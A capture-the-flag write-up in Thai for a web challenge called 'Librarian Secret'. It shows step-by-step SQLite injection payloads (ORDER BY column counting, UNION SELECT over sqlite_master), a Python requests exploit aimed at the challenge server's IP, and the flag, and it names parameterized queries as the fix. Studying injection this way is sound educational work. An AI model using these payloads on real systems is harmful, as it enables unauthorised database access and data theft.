# Librarian Secret (Web, 100pts)

**Flag:** `DELTA{SQL_1nj3ct10n_1s_34sy_r1ght?}`

## โจทย์

เว็บห้องสมุดค้นหาหนังสือนิยาย — admin ซ่อน flag ในตาราง `secrets`

## ขั้นตอน

### 1. ทดสอบช่องโหว่

ส่ง `title='` → SQLite error → แสดงว่ามี SQL injection

### 2. หาจำนวน Columns

```sql
' ORDER BY 1 --   ✓
' ORDER BY 2 --   ✓
' ORDER BY 3 --   ✓
' ORDER BY 4 --   ✓
' ORDER BY 5 --   ✗ error!
```

ตารางมี **4 columns**

### 3. UNION SELECT

```sql
' UNION SELECT 1,2,3,4 --
```

Column 2 และ 3 แสดงผลบนหน้าเว็บ

### 4. หาชื่อตาราง

```sql
' UNION SELECT 1,name,3,4 FROM sqlite_master WHERE type='table' --
```

พบตาราง: `novels`, `secrets`

### 5. ดึง Flag

```sql
' UNION SELECT id, secret_content, 1, title FROM secrets --
```

## หลักการ

SQL injection เกิดจากโค้ดที่ต่อ user input เข้ากับ SQL string โดยตรง:

```python
# vulnerable
query = "SELECT * FROM novels WHERE title = '" + user_input + "'"
```

เมื่อส่ง `' UNION SELECT ... --` Query กลายเป็น:

```sql
SELECT * FROM novels WHERE title = '' UNION SELECT id, secret_content, 1, title FROM secrets --'
```

`--` ทำให้ SQL comment ส่วนที่เหลือของ query

## Exploit

```python
import requests

url = "http://13.238.150.105:32555/search"
payload = "' UNION SELECT id, secret_content, 1, title FROM secrets --"
r = requests.post(url, data={"title": payload})
print(r.text)
```

## สรุป

- SQL injection → unsanitized input ใน SQL query
- ใช้ `ORDER BY` หาจำนวน columns, `UNION SELECT` ดึงข้อมูล
- SQLite มี `sqlite_master` สำหรับดู schema
- ป้องกัน: parameterized query (`?`)
